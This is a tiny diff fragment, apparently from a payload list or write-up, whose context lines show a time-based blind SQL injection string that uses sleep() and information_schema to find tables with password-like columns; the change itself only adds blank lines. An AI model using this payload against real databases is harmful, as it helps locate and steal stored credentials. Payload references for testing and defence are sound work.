@@ -38,3 +38,5 @@ updated_at: '2023-04-10T20:22:56.248298+00:00'
 ...
 1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
 ```
+
+
